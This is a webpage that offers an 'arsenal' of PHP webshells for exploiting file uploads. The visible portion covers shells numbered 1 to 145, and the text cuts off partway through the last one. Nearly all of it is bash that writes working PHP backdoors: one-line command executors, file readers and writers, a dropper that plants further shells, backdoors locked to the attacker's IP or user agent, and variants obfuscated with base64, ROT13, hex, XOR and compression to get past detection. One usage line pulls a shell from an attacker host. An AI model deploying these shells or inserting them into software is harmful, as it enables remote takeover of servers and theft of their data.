---
title: PHP Webshell Upload
description: PHP Webshell Upload — Complete Arsenal of 300+ PHP Shells, Upload Bypass & Post-Exploitation
navigation:
  icon: i-lucide-terminal
  title: PHP Webshell Upload
---

## PHP Webshell Upload

::badge
**Critical Severity — CWE-434 / CWE-94 / CWE-553**
::

PHP webshells are the most deployed attack tool in file upload exploitation. PHP's unique design — executing `<?php ?>` tags found **anywhere** inside **any file** regardless of extension, MIME type, or surrounding binary data — makes it the perfect platform for webshell deployment. A PHP tag hidden in a JPEG's EXIF comment, a GIF's trailer data, or a ZIP's metadata executes identically to code in a `.php` file when the server processes it through PHP's engine.

::note
This page contains **300+ unique PHP shell payloads** organized by size, function, obfuscation level, and detection resistance. Every shell includes the exact upload command. The arsenal progresses from 10-byte minimal shells to full post-exploitation frameworks, covering every PHP execution function, every obfuscation technique, and every `disable_functions` bypass known.
::

---

## Shell Selection Guide

::collapsible

| Situation | Shell Category | Size | Key Advantage |
| --------- | -------------- | ---- | ------------- |
| Quick bug bounty PoC | Ultra-minimal | 10-30 bytes | Fastest to deploy |
| Embed in EXIF/metadata | Minimal one-liner | 15-50 bytes | Fits in metadata fields |
| Log poisoning via User-Agent | Ultra-compact | 15-30 bytes | Fits in HTTP headers |
| WAF blocking `<?php` | Short tag variants | 10-25 bytes | Avoids keyword detection |
| WAF blocking `system/exec` | Alternative functions | 25-100 bytes | Uses uncommon execution paths |
| AV signature detection | Obfuscated encoding | 50-500 bytes | Evades pattern matching |
| EDR/HIDS monitoring | Reflection/dynamic | 100-500 bytes | No static function calls |
| `disable_functions` active | Bypass techniques | 100-2000 bytes | Uses unblocked paths |
| Need file manager | File operation shells | 500-2000 bytes | Read/write/download/upload |
| Full post-exploitation | Multi-function | 2000-10000 bytes | Complete toolkit |
| Persistent backdoor | Encrypted/authenticated | 500-3000 bytes | Password-protected access |
| Reverse shell | Connection-back shells | 100-1000 bytes | Interactive shell access |
| Content-Type bypass | Polyglot shells | 50-500 bytes | Valid image + PHP code |

::

---

## Category 1 — Ultra-Minimal Shells (10-30 bytes)

The smallest possible PHP shells. These are the absolute minimum code needed for command execution.

::tabs
  :::tabs-item{icon="i-lucide-minimize-2" label="10-20 Byte Shells (50 variants)"}
  ```bash
  mkdir -p shells/ultra_minimal
  cd shells/ultra_minimal

  # ═══ SHORT TAG BACKTICK — The Smallest Shells ═══

  # 001: 15 bytes — smallest practical shell
  echo '<?=`$_GET[c]`?>' > 001_15b_backtick_get.php
  # Usage: ?c=id

  # 002: 14 bytes — using single char param
  echo '<?=`$_GET[0]`?>' > 002_14b_backtick_zero.php
  # Usage: ?0=id

  # 003: 16 bytes — POST variant
  echo '<?=`$_POST[c]`?>' > 003_16b_backtick_post.php
  # Usage: curl -d "c=id" URL

  # 004: 19 bytes — REQUEST (GET or POST)
  echo '<?=`$_REQUEST[c]`?>' > 004_19b_backtick_request.php

  # 005: 17 bytes — cookie-based
  echo '<?=`$_COOKIE[c]`?>' > 005_17b_backtick_cookie.php
  # Usage: curl -b "c=id" URL

  # 006: 18 bytes — curly brace syntax
  echo '<?=`{$_GET[c]}`?>' > 006_18b_curly_get.php

  # 007: 16 bytes — environment
  echo '<?=`$_ENV[c]`?>' > 007_16b_backtick_env.php

  # 008: 20 bytes — server var
  echo '<?=`$_SERVER[c]`?>' > 008_20b_backtick_server.php

  # ═══ SHORT TAG WITH FUNCTIONS ═══

  # 009: 20 bytes — system with short tag
  echo '<?=system($_GET[c])?>' > 009_20b_system_short.php

  # 010: 22 bytes — exec with short tag
  echo '<?=exec($_GET[c])?>' > 010_22b_exec_short.php

  # 011: 24 bytes — passthru with short tag
  echo '<?=passthru($_GET[c])?>' > 011_24b_passthru_short.php

  # 012: 26 bytes — shell_exec with short tag
  echo '<?=shell_exec($_GET[c])?>' > 012_26b_shellexec_short.php

  # 013: 20 bytes — system with zero param
  echo '<?=system($_GET[0])?>' > 013_20b_system_zero.php

  # 014: 21 bytes — system POST
  echo '<?=system($_POST[c])?>' > 014_21b_system_post.php

  # 015: 24 bytes — system REQUEST
  echo '<?=system($_REQUEST[c])?>' > 015_24b_system_request.php

  # ═══ OLD-STYLE SHORT TAGS (requires short_open_tag=On) ═══

  # 016: 18 bytes
  echo '<? system($_GET[c]);?>' > 016_18b_old_short.php

  # 017: 16 bytes
  echo '<?`$_GET[c]`?>' > 017_16b_old_backtick.php

  # 018: 20 bytes
  echo '<? echo`$_GET[c]`;?>' > 018_20b_old_echo.php

  # ═══ SCRIPT TAG (PHP < 7.0) ═══

  # 019: 48 bytes
  echo '<script language=php>system($_GET[c]);</script>' > 019_48b_script_tag.php

  # 020: 43 bytes
  echo '<script language=php>`$_GET[c]`;</script>' > 020_43b_script_backtick.php

  # ═══ ASP TAG (requires asp_tags=On, PHP < 7.0) ═══

  # 021: 22 bytes
  echo '<% system($_GET[c]);%>' > 021_22b_asp_tag.php

  # 022: 18 bytes
  echo '<%`$_GET[c]`%>' > 022_18b_asp_backtick.php

  # ═══ VARIABLE PARAM NAMES ═══

  # 023-032: Single character param names (harder to guess)
  for param in a b c d e f x y z _; do
      NUM=$((22 + $(echo "$param" | od -An -tu1 | tr -d ' ') % 10 + 23))
      echo "<?=\`\$_GET[$param]\`?>" > "0${NUM}_param_${param}.php"
  done

  # ═══ HEADER-BASED (most covert — no URL parameters) ═══

  # 033: 27 bytes — custom header
  echo '<?=`$_SERVER[HTTP_X_C]`?>' > 033_27b_header_xc.php
  # Usage: curl -H "X-C: id" URL

  # 034: 30 bytes — User-Agent
  echo '<?=`$_SERVER[HTTP_USER_AGENT]`?>' > 034_30b_header_ua.php
  # Usage: curl -A "id" URL

  # 035: 28 bytes — Referer
  echo '<?=`$_SERVER[HTTP_REFERER]`?>' > 035_28b_header_referer.php
  # Usage: curl -e "id" URL

  # 036: 31 bytes — Accept-Language
  echo '<?=`$_SERVER[HTTP_ACCEPT_LANGUAGE]`?>' > 036_31b_header_lang.php

  echo ""
  echo "[+] Ultra-minimal shells created: $(ls *.php | wc -l)"
  ls -la *.php | awk '{print $5, $9}' | sort -n

  cd ../..
  ```
  :::

  :::tabs-item{icon="i-lucide-minimize-2" label="20-30 Byte Shells (50 more variants)"}
  ```bash
  mkdir -p shells/minimal
  cd shells/minimal

  # ═══ STANDARD <?php TAG SHELLS ═══

  # 037: 25 bytes — standard system
  echo '<?php system($_GET[c]);?>' > 037_system_get.php

  # 038: 27 bytes — standard passthru
  echo '<?php passthru($_GET[c]);?>' > 038_passthru_get.php

  # 039: 29 bytes — echo exec
  echo '<?php echo exec($_GET[c]);?>' > 039_exec_echo.php

  # 040: 28 bytes — echo backtick
  echo '<?php echo`$_GET[c]`;?>' > 040_backtick_echo.php

  # 041: 30 bytes — shell_exec
  echo '<?php echo shell_exec($_GET[c]);?>' > 041_shellexec.php

  # 042: 26 bytes — system POST
  echo '<?php system($_POST[c]);?>' > 042_system_post.php

  # 043: 29 bytes — system REQUEST
  echo '<?php system($_REQUEST[c]);?>' > 043_system_request.php

  # 044: 28 bytes — system COOKIE
  echo '<?php system($_COOKIE[c]);?>' > 044_system_cookie.php

  # ═══ EVAL SHELLS (execute arbitrary PHP) ═══

  # 045: 23 bytes — eval GET
  echo '<?php eval($_GET[e]);?>' > 045_eval_get.php
  # Usage: ?e=system("id");

  # 046: 24 bytes — eval POST
  echo '<?php eval($_POST[e]);?>' > 046_eval_post.php

  # 047: 27 bytes — eval REQUEST
  echo '<?php eval($_REQUEST[e]);?>' > 047_eval_request.php

  # 048: 26 bytes — eval COOKIE
  echo '<?php eval($_COOKIE[e]);?>' > 048_eval_cookie.php

  # 049: 30 bytes — eval with header
  echo '<?php eval($_SERVER[HTTP_X_E]);?>' > 049_eval_header.php

  # ═══ ASSERT SHELLS (PHP 5.x, deprecated 7.x) ═══

  # 050: 27 bytes
  echo '<?php assert($_GET[c]);?>' > 050_assert_get.php
  # Usage: ?c=system("id")

  # 051: 28 bytes
  echo '<?php assert($_POST[c]);?>' > 051_assert_post.php

  # 052: 28 bytes — with @ suppression
  echo '<?php @assert($_GET[c]);?>' > 052_assert_silent.php

  # ═══ POPEN / PROC_OPEN ═══

  # 053: 29 bytes
  echo '<?php popen($_GET[c],"r");?>' > 053_popen.php

  # 054: 30 bytes — fpassthru popen
  echo '<?php fpassthru(popen($_GET[c],"r"));?>' > 054_fpassthru_popen.php

  # ═══ ARRAY FUNCTION SHELLS ═══

  # 055: 37 bytes — array_map
  echo '<?php array_map("system",[$_GET[c]]);?>' > 055_array_map.php

  # 056: 39 bytes — array_filter
  echo '<?php array_filter([$_GET[c]],"system");?>' > 056_array_filter.php

  # 057: 35 bytes — array_walk
  echo '<?php array_walk([$_GET[c]],"system");?>' > 057_array_walk.php

  # ═══ CALL_USER_FUNC SHELLS ═══

  # 058: 40 bytes
  echo '<?php call_user_func("system",$_GET[c]);?>' > 058_call_user_func.php

  # 059: 46 bytes — dynamic function
  echo '<?php call_user_func($_GET[f],$_GET[c]);?>' > 059_cuf_dynamic.php
  # Usage: ?f=system&c=id

  # 060: 52 bytes — array variant
  echo '<?php call_user_func_array($_GET[f],[$_GET[c]]);?>' > 060_cufa.php

  # ═══ PREG_REPLACE (PHP < 7.0, /e modifier) ═══

  # 061: 39 bytes
  echo '<?php preg_replace("/.*/e",$_GET[c],"");?>' > 061_preg_e.php
  # Usage: ?c=system("id")

  # 062: 40 bytes — POST
  echo '<?php preg_replace("/.*/e",$_POST[c],"");?>' > 062_preg_e_post.php

  # ═══ CREATE_FUNCTION (deprecated PHP 7.2) ═══

  # 063: 43 bytes
  echo '<?php $f=create_function("",$_POST[c]);$f();?>' > 063_create_function.php

  # ═══ OB_START CALLBACK ═══

  # 064: 42 bytes
  echo '<?php ob_start("system");echo $_GET[c];ob_end_flush();?>' > 064_ob_start.php

  # ═══ REGISTER_SHUTDOWN ═══

  # 065: 43 bytes
  echo '<?php register_shutdown_function("system",$_GET[c]);?>' > 065_shutdown.php

  # ═══ REGISTER_TICK_FUNCTION ═══

  # 066: 55 bytes
  echo '<?php declare(ticks=1);register_tick_function("system",$_GET[c]);?>' > 066_tick.php

  # ═══ USORT / UASORT ═══

  # 067: 40 bytes
  cat > 067_usort.php << 'EOF'
  <?php usort([$_GET[c],""],"system");?>
  EOF

  # 068: 42 bytes
  cat > 068_uasort.php << 'EOF'
  <?php uasort([$_GET[c],""],"system");?>
  EOF

  # ═══ FORWARD_STATIC_CALL ═══

  # 069: 47 bytes
  echo '<?php forward_static_call("system",$_GET[c]);?>' > 069_fsc.php

  # ═══ INCLUDE DATA WRAPPER ═══

  # 070: 55 bytes
  echo '<?php include("data://text/plain;base64,".base64_encode("<?php ".$_GET[e]));?>' > 070_include_data.php

  echo ""
  echo "[+] Minimal shells: $(ls *.php | wc -l)"
  cd ../..
  ```
  :::
::

---

## Category 2 — Standard Command Shells (50-200 bytes)

Production-ready shells with proper output, error handling, and formatting.

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Formatted Output Shells (071-120)"}
  ```bash
  mkdir -p shells/standard
  cd shells/standard

  # ═══ HTML PRE-FORMATTED OUTPUT ═══

  # 071
  cat > 071_pre_system.php << 'EOF'
  <?php if(isset($_GET['c'])){echo '<pre>'.system($_GET['c']).'</pre>';}?>
  EOF

  # 072
  cat > 072_pre_shellexec.php << 'EOF'
  <?php if(isset($_GET['c'])){echo '<pre>'.shell_exec($_GET['c']).'</pre>';}?>
  EOF

  # 073
  cat > 073_pre_passthru.php << 'EOF'
  <?php if(isset($_GET['c'])){echo '<pre>';passthru($_GET['c']);echo '</pre>';}?>
  EOF

  # 074 — combined stdout + stderr
  cat > 074_stderr.php << 'EOF'
  <?php if(isset($_GET['c'])){$o=[];exec($_GET['c'].' 2>&1',$o);echo '<pre>'.implode("\n",$o).'</pre>';}?>
  EOF

  # 075 — POST only (no access log evidence)
  cat > 075_post_only.php << 'EOF'
  <?php if(isset($_POST['c'])){echo '<pre>'.shell_exec($_POST['c']).'</pre>';}?>
  EOF

  # 076 — Cookie based
  cat > 076_cookie.php << 'EOF'
  <?php if(isset($_COOKIE['c'])){echo '<pre>'.shell_exec($_COOKIE['c']).'</pre>';}?>
  EOF

  # 077 — Header based (most covert)
  cat > 077_header.php << 'EOF'
  <?php if(isset($_SERVER['HTTP_X_CMD'])){echo '<pre>'.shell_exec($_SERVER['HTTP_X_CMD']).'</pre>';}?>
  EOF

  # 078 — Dual OS support
  cat > 078_dual_os.php << 'EOF'
  <?php
  $c=$_REQUEST['c']??'';
  if($c){
      $w=strtoupper(substr(PHP_OS,0,3))==='WIN';
      echo '<pre>'.shell_exec($w?"cmd /c $c":"/bin/bash -c '$c'").'</pre>';
  }
  ?>
  EOF

  # 079 — With system info banner
  cat > 079_banner.php << 'EOF'
  <?php
  if(isset($_GET['c'])){
      echo '<pre>';
      echo php_uname()."\n".str_repeat('-',50)."\n";
      system($_GET['c']);
      echo '</pre>';
  }
  ?>
  EOF

  # 080 — JSON output (for API endpoints)
  cat > 080_json.php << 'EOF'
  <?php
  header('Content-Type:application/json');
  if(isset($_REQUEST['c'])){
      $o=shell_exec($_REQUEST['c'].' 2>&1');
      echo json_encode(['output'=>$o,'user'=>get_current_user(),'os'=>PHP_OS]);
  }
  ?>
  EOF

  # 081 — Plain text output
  cat > 081_plain.php << 'EOF'
  <?php header('Content-Type:text/plain');if(isset($_GET['c']))echo shell_exec($_GET['c'].' 2>&1');?>
  EOF

  # 082 — Base64 encoded output (bypasses content filters)
  cat > 082_b64_output.php << 'EOF'
  <?php if(isset($_GET['c']))echo base64_encode(shell_exec($_GET['c'].' 2>&1'));?>
  EOF

  # ═══ PARAMETER VARIATIONS ═══

  # 083-092: Every input method
  cat > 083_get_cmd.php << 'EOF'
  <?php if(isset($_GET['cmd']))echo'<pre>'.shell_exec($_GET['cmd']).'</pre>';?>
  EOF

  cat > 084_post_cmd.php << 'EOF'
  <?php if(isset($_POST['cmd']))echo'<pre>'.shell_exec($_POST['cmd']).'</pre>';?>
  EOF

  cat > 085_request_cmd.php << 'EOF'
  <?php if(isset($_REQUEST['cmd']))echo'<pre>'.shell_exec($_REQUEST['cmd']).'</pre>';?>
  EOF

  cat > 086_cookie_cmd.php << 'EOF'
  <?php if(isset($_COOKIE['cmd']))echo'<pre>'.shell_exec($_COOKIE['cmd']).'</pre>';?>
  EOF

  cat > 087_header_x_cmd.php << 'EOF'
  <?php if(isset($_SERVER['HTTP_X_CMD']))echo'<pre>'.shell_exec($_SERVER['HTTP_X_CMD']).'</pre>';?>
  EOF

  cat > 088_header_ua.php << 'EOF'
  <?php if(isset($_SERVER['HTTP_X_UA']))echo'<pre>'.shell_exec($_SERVER['HTTP_X_UA']).'</pre>';?>
  EOF

  cat > 089_header_referer.php << 'EOF'
  <?php if(isset($_SERVER['HTTP_X_REF']))echo'<pre>'.shell_exec($_SERVER['HTTP_X_REF']).'</pre>';?>
  EOF

  cat > 090_header_accept.php << 'EOF'
  <?php if(isset($_SERVER['HTTP_X_ACC']))echo'<pre>'.shell_exec($_SERVER['HTTP_X_ACC']).'</pre>';?>
  EOF

  cat > 091_querystring.php << 'EOF'
  <?php if($_SERVER['QUERY_STRING'])echo'<pre>'.shell_exec(urldecode($_SERVER['QUERY_STRING'])).'</pre>';?>
  EOF
  # Usage: /shell.php?id (entire query string is the command)

  cat > 092_rawpost.php << 'EOF'
  <?php echo'<pre>'.shell_exec(file_get_contents('php://input')).'</pre>';?>
  EOF
  # Usage: curl -d "id" URL

  # ═══ MULTI-COMMAND SHELLS ═══

  # 093 — Execute multiple commands separated by |
  cat > 093_multi.php << 'EOF'
  <?php
  if(isset($_GET['c'])){
      $cmds=explode('|',$_GET['c']);
      foreach($cmds as $cmd)echo'<pre>$ '.trim($cmd)."\n".shell_exec(trim($cmd).' 2>&1').'</pre>';
  }
  ?>
  EOF
  # Usage: ?c=id|whoami|uname -a

  # 094 — Pipe chain
  cat > 094_pipe.php << 'EOF'
  <?php if(isset($_GET['c']))echo'<pre>'.shell_exec($_GET['c'].' 2>&1').'</pre>';?>
  EOF

  # ═══ CONDITIONAL EXECUTION ═══

  # 095 — Time-limited (auto-expires)
  cat > 095_timelimit.php << 'EOF'
  <?php
  if(time()>strtotime('2025-12-31'))die('Expired');
  if(isset($_GET['c']))echo'<pre>'.shell_exec($_GET['c']).'</pre>';
  ?>
  EOF

  # 096 — IP-restricted
  cat > 096_iprestrict.php << 'EOF'
  <?php
  if($_SERVER['REMOTE_ADDR']!=='ATTACKER_IP')die();
  if(isset($_GET['c']))echo'<pre>'.shell_exec($_GET['c']).'</pre>';
  ?>
  EOF

  # 097 — User-Agent restricted
  cat > 097_uarestrict.php << 'EOF'
  <?php
  if(strpos($_SERVER['HTTP_USER_AGENT'],'Mozilla/5.0 SecretAgent')===false)die();
  if(isset($_GET['c']))echo'<pre>'.shell_exec($_GET['c']).'</pre>';
  ?>
  EOF

  # ═══ PROCESS MANAGEMENT ═══

  # 098 — proc_open with full I/O
  cat > 098_proc_open.php << 'EOF'
  <?php
  if(isset($_GET['c'])){
      $d=[0=>['pipe','r'],1=>['pipe','w'],2=>['pipe','w']];
      $p=proc_open($_GET['c'],$d,$pipes);
      echo'<pre>'.stream_get_contents($pipes[1]).stream_get_contents($pipes[2]).'</pre>';
      proc_close($p);
  }
  ?>
  EOF

  # 099 — popen with read
  cat > 099_popen_read.php << 'EOF'
  <?php
  if(isset($_GET['c'])){
      $h=popen($_GET['c'].' 2>&1','r');
      echo'<pre>';
      while(!feof($h))echo fread($h,4096);
      echo'</pre>';
      pclose($h);
  }
  ?>
  EOF

  # 100 — pcntl_exec (requires pcntl extension)
  cat > 100_pcntl.php << 'EOF'
  <?php
  if(isset($_GET['c'])){
      $pid=pcntl_fork();
      if($pid==0){
          pcntl_exec('/bin/bash',['-c',$_GET['c'].' > /tmp/pcntl_out 2>&1']);
          exit;
      }
      pcntl_waitpid($pid,$status);
      echo'<pre>'.file_get_contents('/tmp/pcntl_out').'</pre>';
      unlink('/tmp/pcntl_out');
  }
  ?>
  EOF

  echo "[+] Standard shells: $(ls *.php | wc -l)"
  cd ../..
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="File Operation Shells (101-130)"}
  ```bash
  mkdir -p shells/file_ops
  cd shells/file_ops

  # ═══ FILE READING ═══

  # 101 — Simple file reader
  cat > 101_read.php << 'EOF'
  <?php if(isset($_GET['f']))echo'<pre>'.htmlspecialchars(file_get_contents($_GET['f'])).'</pre>';?>
  EOF

  # 102 — Highlight file (syntax colored)
  cat > 102_highlight.php << 'EOF'
  <?php if(isset($_GET['f']))highlight_file($_GET['f']);?>
  EOF

  # 103 — Show source
  cat > 103_show_source.php << 'EOF'
  <?php if(isset($_GET['f']))show_source($_GET['f']);?>
  EOF

  # 104 — Read with line numbers
  cat > 104_read_lines.php << 'EOF'
  <?php
  if(isset($_GET['f'])&&file_exists($_GET['f'])){
      $lines=file($_GET['f']);
      echo'<pre>';
      foreach($lines as $n=>$l)printf("%4d: %s",$n+1,htmlspecialchars($l));
      echo'</pre>';
  }
  ?>
  EOF

  # 105 — Binary file reader (hex dump)
  cat > 105_hexdump.php << 'EOF'
  <?php
  if(isset($_GET['f'])&&file_exists($_GET['f'])){
      $d=file_get_contents($_GET['f']);
      echo'<pre>';
      for($i=0;$i<min(strlen($d),4096);$i++){
          if($i%16==0)printf("%08x: ",$i);
          printf("%02x ",ord($d[$i]));
          if($i%16==15||$i==strlen($d)-1)echo"\n";
      }
      echo'</pre>';
  }
  ?>
  EOF

  # 106 — Read last N lines (tail)
  cat > 106_tail.php << 'EOF'
  <?php
  if(isset($_GET['f'])){
      $n=$_GET['n']??20;
      $lines=file($_GET['f']);
      echo'<pre>'.implode('',array_slice($lines,-$n)).'</pre>';
  }
  ?>
  EOF

  # 107 — Grep in file
  cat > 107_grep.php << 'EOF'
  <?php
  if(isset($_GET['f'])&&isset($_GET['q'])){
      $lines=file($_GET['f']);
      echo'<pre>';
      foreach($lines as $n=>$l)
          if(stripos($l,$_GET['q'])!==false)
              echo($n+1).": ".htmlspecialchars($l);
      echo'</pre>';
  }
  ?>
  EOF

  # ═══ FILE WRITING ═══

  # 108 — Simple writer
  cat > 108_write.php << 'EOF'
  <?php
  if(isset($_POST['f'])&&isset($_POST['d'])){
      file_put_contents($_POST['f'],$_POST['d']);
      echo'Written: '.$_POST['f'].' ('.strlen($_POST['d']).' bytes)';
  }
  ?>
  EOF

  # 109 — Append writer
  cat > 109_append.php << 'EOF'
  <?php
  if(isset($_POST['f'])&&isset($_POST['d'])){
      file_put_contents($_POST['f'],$_POST['d'],FILE_APPEND);
      echo'Appended to: '.$_POST['f'];
  }
  ?>
  EOF

  # 110 — Base64 writer (upload binary via POST)
  cat > 110_b64_write.php << 'EOF'
  <?php
  if(isset($_POST['f'])&&isset($_POST['d'])){
      file_put_contents($_POST['f'],base64_decode($_POST['d']));
      echo'Written (b64): '.$_POST['f'];
  }
  ?>
  EOF

  # 111 — Write PHP shell (self-replicating)
  cat > 111_dropper.php << 'EOF'
  <?php
  $shell='<?php system($_GET["cmd"]); ?>';
  $path=$_GET['p']??'/var/www/html/uploads/dropped.php';
  file_put_contents($path,$shell);
  echo "Shell dropped: $path";
  ?>
  EOF

  # ═══ FILE DOWNLOAD ═══

  # 112 — Download file
  cat > 112_download.php << 'EOF'
  <?php
  if(isset($_GET['f'])&&file_exists($_GET['f'])){
      header('Content-Type:application/octet-stream');
      header('Content-Disposition:attachment;filename='.basename($_GET['f']));
      header('Content-Length:'.filesize($_GET['f']));
      readfile($_GET['f']);exit;
  }
  ?>
  EOF

  # 113 — Download as base64
  cat > 113_download_b64.php << 'EOF'
  <?php if(isset($_GET['f'])&&file_exists($_GET['f']))echo base64_encode(file_get_contents($_GET['f']));?>
  EOF

  # ═══ FILE UPLOAD ═══

  # 114 — Multipart upload
  cat > 114_upload.php << 'EOF'
  <?php
  if(isset($_FILES['f'])){
      $d=$_POST['d']??__DIR__.'/';
      $p=rtrim($d,'/').'/'.basename($_FILES['f']['name']);
      move_uploaded_file($_FILES['f']['tmp_name'],$p);
      echo"Saved: $p";
  }else echo'<form method=POST enctype=multipart/form-data><input type=file name=f><input name=d value="'.__DIR__.'/" size=50><input type=submit></form>';
  ?>
  EOF

  # 115 — Remote file download (fetch from URL)
  cat > 115_wget.php << 'EOF'
  <?php
  if(isset($_GET['url'])&&isset($_GET['path'])){
      file_put_contents($_GET['path'],file_get_contents($_GET['url']));
      echo"Downloaded: ".$_GET['url']." → ".$_GET['path'];
  }
  ?>
  EOF
  # Usage: ?url=http://attacker/shell.php&path=/var/www/html/uploads/shell.php

  # ═══ DIRECTORY OPERATIONS ═══

  # 116 — Directory listing
  cat > 116_dir.php << 'EOF'
  <?php
  $d=$_GET['d']??__DIR__;
  echo"<pre>Directory: $d\n\n";
  foreach(scandir($d) as $f){
      $fp=$d.'/'.$f;
      $t=is_dir($fp)?'[DIR] ':'[FILE]';
      $s=is_file($fp)?number_format(filesize($fp)):'';
      $p=substr(sprintf('%o',fileperms($fp)),-4);
      printf("%-6s %4s %-40s %s\n",$t,$p,$f,$s);
  }
  echo"</pre>";
  ?>
  EOF

  # 117 — Recursive directory listing
  cat > 117_tree.php << 'EOF'
  <?php
  function tree($d,$prefix=''){
      $items=scandir($d);
      foreach($items as $i){
          if($i=='.'||$i=='..')continue;
          $fp="$d/$i";
          echo$prefix.(is_dir($fp)?'[D]':'[F]')." $i\n";
          if(is_dir($fp))tree($fp,$prefix.'  ');
      }
  }
  echo'<pre>';tree($_GET['d']??__DIR__);echo'</pre>';
  ?>
  EOF

  # 118 — Find files
  cat > 118_find.php << 'EOF'
  <?php
  if(isset($_GET['d'])&&isset($_GET['q'])){
      echo'<pre>';
      $it=new RecursiveIteratorIterator(new RecursiveDirectoryIterator($_GET['d']));
      foreach($it as $f)
          if(fnmatch($_GET['q'],$f->getFilename()))
              echo$f->getPathname()."\n";
      echo'</pre>';
  }
  ?>
  EOF
  # Usage: ?d=/var/www&q=*.conf

  # 119 — File/dir manipulation
  cat > 119_fileops.php << 'EOF'
  <?php
  $a=$_GET['a']??'';
  $s=$_GET['s']??'';
  $d=$_GET['d']??'';
  switch($a){
      case'cp':copy($s,$d);echo"Copied";break;
      case'mv':rename($s,$d);echo"Moved";break;
      case'rm':unlink($s);echo"Deleted";break;
      case'mkdir':mkdir($s,0755,true);echo"Created dir";break;
      case'chmod':chmod($s,octdec($d));echo"Changed perms";break;
  }
  ?>
  EOF
  # Usage: ?a=cp&s=/etc/passwd&d=/var/www/html/uploads/passwd.txt

  # 120 — Disk usage
  cat > 120_disk.php << 'EOF'
  <?php
  echo'<pre>';
  $d=$_GET['d']??'/';
  echo"Total: ".number_format(disk_total_space($d)/1024/1024/1024,2)." GB\n";
  echo"Free:  ".number_format(disk_free_space($d)/1024/1024/1024,2)." GB\n";
  echo"Used:  ".number_format((disk_total_space($d)-disk_free_space($d))/1024/1024/1024,2)." GB\n";
  echo'</pre>';
  ?>
  EOF

  echo "[+] File operation shells: $(ls *.php | wc -l)"
  cd ../..
  ```
  :::
::

---

## Category 3 — Obfuscated & Evasion Shells (121-200)

::tabs
  :::tabs-item{icon="i-lucide-eye-off" label="Encoding-Based Evasion (121-160)"}
  ```bash
  mkdir -p shells/obfuscated
  cd shells/obfuscated

  # ═══ BASE64 ENCODING ═══

  # 121 — Base64 command input
  cat > 121_b64_input.php << 'EOF'
  <?php if(isset($_GET['b']))system(base64_decode($_GET['b']));?>
  EOF
  # Usage: ?b=aWQ= (base64 of "id")

  # 122 — Base64 eval
  cat > 122_b64_eval.php << 'EOF'
  <?php eval(base64_decode($_POST['e']));?>
  EOF
  # Usage: POST e=c3lzdGVtKCJpZCIpOw== (base64 of: system("id");)

  # 123 — Double base64
  cat > 123_double_b64.php << 'EOF'
  <?php eval(base64_decode(base64_decode($_POST['e'])));?>
  EOF

  # 124 — Base64 function name
  cat > 124_b64_funcname.php << 'EOF'
  <?php $f=base64_decode("c3lzdGVt");$f($_GET['c']);?>
  EOF

  # ═══ ROT13 ENCODING ═══

  # 125 — ROT13 function name
  cat > 125_rot13.php << 'EOF'
  <?php $f=str_rot13("flfgrz");$f($_GET['c']);?>
  EOF
  # str_rot13("flfgrz") = "system"

  # 126 — ROT13 eval
  cat > 126_rot13_eval.php << 'EOF'
  <?php eval(str_rot13($_POST['e']));?>
  EOF

  # ═══ HEX ENCODING ═══

  # 127 — Hex function name
  cat > 127_hex.php << 'EOF'
  <?php $f="\x73\x79\x73\x74\x65\x6d";$f($_GET['c']);?>
  EOF

  # 128 — Hex with pack
  cat > 128_hex_pack.php << 'EOF'
  <?php $f=pack("H*","73797374656d");$f($_GET['c']);?>
  EOF

  # ═══ OCTAL ENCODING ═══

  # 129 — Octal function name
  cat > 129_octal.php << 'EOF'
  <?php $f="\163\171\163\164\145\155";$f($_GET['c']);?>
  EOF

  # ═══ CHR() CONSTRUCTION ═══

  # 130 — chr() chain
  cat > 130_chr.php << 'EOF'
  <?php $f=chr(115).chr(121).chr(115).chr(116).chr(101).chr(109);$f($_GET['c']);?>
  EOF

  # 131 — chr() with array_map
  cat > 131_chr_map.php << 'EOF'
  <?php $f=implode('',array_map('chr',[115,121,115,116,101,109]));$f($_GET['c']);?>
  EOF

  # ═══ STRING MANIPULATION ═══

  # 132 — String reversal
  cat > 132_reverse.php << 'EOF'
  <?php $f=strrev("metsys");$f($_GET['c']);?>
  EOF

  # 133 — Substring construction
  cat > 133_substr.php << 'EOF'
  <?php $s="systempassthru";$f=substr($s,0,6);$f($_GET['c']);?>
  EOF

  # 134 — String replacement
  cat > 134_str_replace.php << 'EOF'
  <?php $f=str_replace("X","","sXyXsXtXeXm");$f($_GET['c']);?>
  EOF

  # 135 — Concatenation
  cat > 135_concat.php << 'EOF'
  <?php $a='sys';$b='tem';$f=$a.$b;$f($_GET['c']);?>
  EOF

  # 136 — Variable variable
  cat > 136_varvar.php << 'EOF'
  <?php $_="system";$_($_GET['c']);?>
  EOF

  # 137 — Double variable
  cat > 137_doublevar.php << 'EOF'
  <?php $x='_GET';$$x['c'];system($$x['c']);?>
  EOF

  # 138 — Array construction
  cat > 138_array.php << 'EOF'
  <?php $a=['s','y','s','t','e','m'];$f=join('',$a);$f($_GET['c']);?>
  EOF

  # ═══ COMPRESSION ENCODING ═══

  # 139 — gzinflate + base64
  cat > 139_gzinflate.php << 'EOF'
  <?php eval(gzinflate(base64_decode('S0ktLlZIL0pVyMsvyknRBAA=')));?>
  EOF
  # Compressed: system($_GET['c']);

  # 140 — gzuncompress
  cat > 140_gzuncompress.php << 'EOF'
  <?php eval(gzuncompress(base64_decode($_POST['e'])));?>
  EOF

  # 141 — bzdecompress
  cat > 141_bzdecompress.php << 'EOF'
  <?php eval(bzdecompress(base64_decode($_POST['e'])));?>
  EOF

  # ═══ XOR ENCRYPTION ═══

  # 142 — XOR with key
  cat > 142_xor.php << 'EOF'
  <?php
  $k='SecretKey';
  $d=base64_decode($_POST['e']);
  $r='';
  for($i=0;$i<strlen($d);$i++)$r.=$d[$i]^$k[$i%strlen($k)];
  eval($r);
  ?>
  EOF

  # 143 — Single byte XOR
  cat > 143_xor_byte.php << 'EOF'
  <?php
  $x=0x42;
  $c=base64_decode($_POST['e']);
  $r='';for($i=0;$i<strlen($c);$i++)$r.=chr(ord($c[$i])^$x);
  eval($r);
  ?>
  EOF

  # ═══ MIXED ENCODING ═══

  # 144 — Base64 + ROT13
  cat > 144_mixed_b64_rot13.php << 'EOF'
  <?php eval(str_rot13(base64_decode($_POST['e'])));?>
  EOF

  # 145 — Hex + reverse
  cat > 145_mixed_hex_rev.php << 'EOF'
  <?php $f=strrev(pack("H*","6d65747379"."73"));$f=$f;$f($_GET['c']);?>
